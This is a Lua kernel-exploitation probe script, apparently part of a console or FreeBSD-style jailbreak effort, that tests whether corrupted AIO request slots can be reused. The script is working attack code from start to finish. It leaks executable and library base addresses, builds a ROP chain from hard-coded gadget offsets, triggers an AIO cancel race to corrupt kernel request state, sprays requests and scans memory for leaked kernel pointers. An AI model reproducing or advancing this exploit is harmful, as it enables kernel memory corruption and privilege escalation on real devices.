-- CRASH_CLASS: HIGH
-- PROBE 542b: re-submit AIO on corrupted slot IDs
--
-- After cancel race corrupts spray requests (stuck state=0x1),
-- try submitting NEW AIO requests targeting the same ID range.
-- If submit(669) reuses the corrupted slot and overwrites its
-- internal structure, we could control the I/O target (fd, buffer,
-- offset) of a request the scheduler still considers "active".
--
-- Flow:
-- 1. Corrupt AIO via cancel race (541b pattern)
-- 2. Record all spray IDs (stuck in state=0x1)
-- 3. Submit many new requests → do any reuse corrupted slot IDs?
-- 4. If yes: does the new request work? Does it touch the old buffer?
-- 5. Also try: delete-then-resubmit on corrupted IDs

print("=== PROBE 542b: RE-SUBMIT ON CORRUPTED AIO SLOTS ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function is_kptr(val)
    local h, _ = get_hi_lo(val)
    if h < 0 then h = h + 0x100000000 end
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc666 = make_syscall(666)
local sc670 = make_syscall(670)
local sc135 = make_syscall(135)
local sc6   = make_syscall(6)
local sc5   = make_syscall(5)

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- [A] Init
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return sc5(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom=" .. urand_fd)

local NUM_IDS = 32
local NOP_PAD = 8
local SPRAY_PER_ID = 4

local read_fds = {}
local write_fds = {}
local sv_buf = memory.alloc(8)

for i = 1, NUM_IDS do
    wd(sv_buf, 0xFFFFFFFF); wd(sv_buf + 4, 0xFFFFFFFF)
    local ok_sp, rv_sp = pcall(function()
        return sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv_buf)))
    end)
    local fd0 = safe_rd(sv_buf) or -1
    local fd1 = safe_rd(sv_buf + 4) or -1
    if ok_sp and to_num(rv_sp) == 0 and fd0 >= 0 and fd1 >= 0 then
        read_fds[i] = fd0; write_fds[i] = fd1
    else
        read_fds[i] = -1; write_fds[i] = -1
    end
end

local good_pairs = 0
for i = 1, NUM_IDS do if read_fds[i] >= 0 then good_pairs = good_pairs + 1 end end
print(string.format("  socketpairs=%d/%d", good_pairs, NUM_IDS))

local spray_data_bufs = {}
local spray_res_bufs = {}
for i = 1, NUM_IDS * SPRAY_PER_ID do
    spray_data_bufs[i] = memory.alloc(32)
    spray_res_bufs[i] = memory.alloc(16)
    for j = 0, 28, 4 do wd(spray_data_bufs[i] + j, 0xDEAD0000 + i) end
    wd(spray_res_bufs[i], 0x77777777)
end

local reqs_buf = memory.alloc(0x30)
local ids_out  = memory.alloc(8)

local function aio_submit_read(fd, data_buf, res_buf)
    zero(reqs_buf, 0x28)
    wq(reqs_buf + 0x08, uint64(16))
    wq(reqs_buf + 0x10, uint64(to_num(data_buf)))
    wq(reqs_buf + 0x18, uint64(to_num(res_buf)))
    wd(reqs_buf + 0x20, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_poll_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc664(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)), Z)
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
zero(shared, 0x2000)

-- ============================================================
-- [B] Submit blocking reads + cancel race → corrupt
-- ============================================================
print("")
print("[B] Submit blocking reads + cancel race")

local orig_ids = {}
local ok_count = 0
for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then
        local db = memory.alloc(32); local rb = memory.alloc(16)
        wd(rb, 0)
        local rv, id = aio_submit_read(read_fds[i], db, rb)
        if rv == 0 and id > 0 then
            ok_count = ok_count + 1
            orig_ids[ok_count] = id
        end
    end
end
print(string.format("  originals=%d", ok_count))

zero(shared, 0x1000)
for i = 1, ok_count do
    wd(shared + 0x410 + (i-1) * 4, orig_ids[i])
    wd(shared + 0x010 + (i-1) * 4, 0x77777777)
end

local function build_canceller(count)
    local map_size = 0x400000
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    local shared_n = to_num(shared)
    for i = 0, count - 1 do
        emit(pop_rax_ret); emit(uint64(666))
        emit(pop_rdi_ret); emit(uint64(shared_n + 0x410 + i * 4))
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(uint64(shared_n + 0x010 + i * 4))
        emit(fn_addr)
        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)
    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))
    return tp
end

local tp = build_canceller(ok_count)
pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

local spray_ids = {}
local spray_count = 0
for s = 1, ok_count * SPRAY_PER_ID do
    if s <= #spray_data_bufs then
        local rv, id = aio_submit_read(urand_fd, spray_data_bufs[s], spray_res_bufs[s])
        if rv == 0 and id > 0 then
            spray_count = spray_count + 1
            spray_ids[spray_count] = id
        end
    end
end

local ts = memory.alloc(16)
wq(ts, uint64(3)); wq(ts + 8, Z)
for w = 1, 15 do
    if (safe_rd(shared + 4) or 0) > 0 then break end
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
end

-- Verify corruption
local stuck = 0
for i = 1, spray_count do
    local p_rv, p_st = aio_poll_one(spray_ids[i])
    if not (p_rv == 0 and (p_st == 3 or p_st == 0x10003)) then
        stuck = stuck + 1
    end
end
print(string.format("  spray=%d stuck=%d", spray_count, stuck))

if stuck == 0 then
    print("NO CORRUPTION — aborting")
    print("=== 542b DONE (no corruption) ===")
    return
end
print("  CORRUPTION CONFIRMED")

-- Record the spray ID range
local spray_id_set = {}
local min_spray, max_spray = 999999, 0
for i = 1, spray_count do
    spray_id_set[spray_ids[i]] = true
    if spray_ids[i] < min_spray then min_spray = spray_ids[i] end
    if spray_ids[i] > max_spray then max_spray = spray_ids[i] end
end
print(string.format("  spray ID range: 0x%X - 0x%X", min_spray, max_spray))

-- ============================================================
-- [C] Attempt 1: submit MORE requests, see if IDs overlap
-- ============================================================
print("")
print("[C] Submit new requests — check for ID reuse")

local new_ids = {}
local new_count = 0
local reused_ids = 0
local new_bufs = {}

for i = 1, 64 do
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    for j = 0, 28, 4 do wd(db + j, 0xAAAA0000 + i) end
    wd(rb, 0x77777777)
    local rv, id = aio_submit_read(urand_fd, db, rb)
    if rv == 0 and id > 0 then
        new_count = new_count + 1
        new_ids[new_count] = id
        new_bufs[new_count] = {data = db, res = rb}
        if spray_id_set[id] then
            reused_ids = reused_ids + 1
            print(string.format("  *** ID REUSE: new request got id=0x%X (corrupted spray ID!) ***", id))
        end
    end
end
print(string.format("  new_submitted=%d reused_ids=%d", new_count, reused_ids))

-- Check if new requests completed
wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
pcall(function() sc240(uint64(to_num(ts)), Z) end)

local new_ok, new_stuck = 0, 0
for i = 1, new_count do
    local p_rv, p_st = aio_poll_one(new_ids[i])
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        new_ok = new_ok + 1
    else
        new_stuck = new_stuck + 1
    end
end
print(string.format("  new: ok=%d stuck=%d", new_ok, new_stuck))

-- Check data in new request buffers
local new_data_ok, new_sentinel = 0, 0
for i = 1, new_count do
    local d0 = safe_rd(new_bufs[i].data) or 0
    if d0 == (0xAAAA0000 + i) then
        new_sentinel = new_sentinel + 1
    else
        new_data_ok = new_data_ok + 1
    end
end
print(string.format("  data: written=%d sentinel=%d", new_data_ok, new_sentinel))

-- ============================================================
-- [D] Attempt 2: force-delete corrupted spray, then re-submit
-- ============================================================
print("")
print("[D] Force-delete corrupted spray IDs, then re-submit")

-- Try delete on first 16 corrupted spray IDs
local force_del_ok, force_del_fail = 0, 0
local test_spray = {}
for i = 1, math.min(16, spray_count) do
    test_spray[i] = spray_ids[i]
    local d_rv, d_st = aio_delete_one(spray_ids[i])
    if d_rv == 0 and d_st == 0 then
        force_del_ok = force_del_ok + 1
    else
        force_del_fail = force_del_fail + 1
    end
end
print(string.format("  delete: ok=%d fail=%d", force_del_ok, force_del_fail))

-- After delete attempt, submit new requests and check
local post_del_ids = {}
local post_del_count = 0
local post_del_reuse = 0
local post_del_bufs = {}

for i = 1, 32 do
    local db = memory.alloc(32)
    local rb = memory.alloc(16)
    for j = 0, 28, 4 do wd(db + j, 0xBBBB0000 + i) end
    wd(rb, 0x77777777)
    local rv, id = aio_submit_read(urand_fd, db, rb)
    if rv == 0 and id > 0 then
        post_del_count = post_del_count + 1
        post_del_ids[post_del_count] = id
        post_del_bufs[post_del_count] = {data = db, res = rb}
        if spray_id_set[id] then
            post_del_reuse = post_del_reuse + 1
            print(string.format("  *** POST-DEL REUSE: id=0x%X ***", id))
        end
    end
end
print(string.format("  post-del submitted=%d reused=%d", post_del_count, post_del_reuse))

wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
pcall(function() sc240(uint64(to_num(ts)), Z) end)

local pd_ok, pd_stuck = 0, 0
for i = 1, post_del_count do
    local p_rv, p_st = aio_poll_one(post_del_ids[i])
    if p_rv == 0 and (p_st == 3 or p_st == 0x10003) then
        pd_ok = pd_ok + 1
    else
        pd_stuck = pd_stuck + 1
    end
end
print(string.format("  post-del: ok=%d stuck=%d", pd_ok, pd_stuck))

-- ============================================================
-- [E] Scan everything for kernel pointers
-- ============================================================
print("")
print("[E] Kernel pointer scan")

local kptr_total = 0

-- Scan spray data buffers
for i = 1, spray_count do
    for off = 0, 28, 8 do
        local val = safe_rq(spray_data_bufs[i] + off)
        if val and is_kptr(val) then
            kptr_total = kptr_total + 1
            if kptr_total <= 10 then
                print(string.format("  *** KPTR spray[%d]+0x%X = %s ***", i, off, q(val)))
            end
        end
    end
end

-- Scan new request buffers
for i = 1, new_count do
    for off = 0, 28, 8 do
        local val = safe_rq(new_bufs[i].data + off)
        if val and is_kptr(val) then
            kptr_total = kptr_total + 1
            if kptr_total <= 10 then
                print(string.format("  *** KPTR new[%d]+0x%X = %s ***", i, off, q(val)))
            end
        end
    end
end

-- Scan post-del buffers
for i = 1, post_del_count do
    for off = 0, 28, 8 do
        local val = safe_rq(post_del_bufs[i].data + off)
        if val and is_kptr(val) then
            kptr_total = kptr_total + 1
            if kptr_total <= 10 then
                print(string.format("  *** KPTR post-del[%d]+0x%X = %s ***", i, off, q(val)))
            end
        end
    end
end

print(string.format("  total kernel_ptrs=%d", kptr_total))

-- ============================================================
-- [F] Health check
-- ============================================================
print("")
print("[F] Health check")
local h_db = memory.alloc(32); local h_rb = memory.alloc(16); wd(h_rb, 0x77777777)
local h_rv, h_id = aio_submit_read(urand_fd, h_db, h_rb)
if h_rv == 0 and h_id > 0 then
    wq(ts, uint64(0)); wq(ts + 8, uint64(200000000))
    pcall(function() sc240(uint64(to_num(ts)), Z) end)
    local h_prv, h_pst = aio_poll_one(h_id)
    local h_drv, h_dst = aio_delete_one(h_id)
    print(string.format("  poll=%d/%X del=%d/%X", h_prv, h_pst, h_drv, h_dst))
    if h_pst == 3 and h_dst == 0 then print("  HEALTHY") else print("  *** UNHEALTHY ***") end
else
    print("  CREATE FAILED")
end

-- Cleanup
for i = 1, NUM_IDS do
    if read_fds[i] >= 0 then pcall(function() sc6(uint64(read_fds[i])) end) end
    if write_fds[i] >= 0 then pcall(function() sc6(uint64(write_fds[i])) end) end
end
pcall(function() sc6(uint64(urand_fd)) end)

print("")
local pid2 = to_num(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 542b DONE ===")
